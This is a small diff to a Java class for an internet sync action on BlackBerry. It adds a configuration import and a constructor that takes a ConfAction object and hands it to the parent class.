@@ -17,6 +17,7 @@ import blackberry.action.sync.transport.BisTransport;
 import blackberry.action.sync.transport.DirectTransport;
 import blackberry.action.sync.transport.Wap2Transport;
 import blackberry.action.sync.transport.WifiTransport;
+import blackberry.config.ConfAction;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.utils.Check;
@@ -43,6 +44,10 @@ public class SyncActionInternet extends SyncAction {
         //#ifdef DBC
         Check.requires(actionId == ACTION_SYNC_INTERNET, "Wrong ActionId");
         //#endif
+    }
+
+    public SyncActionInternet(ConfAction conf) {
+        super(conf);
     }
 
     protected boolean parse(final byte[] confParams) {
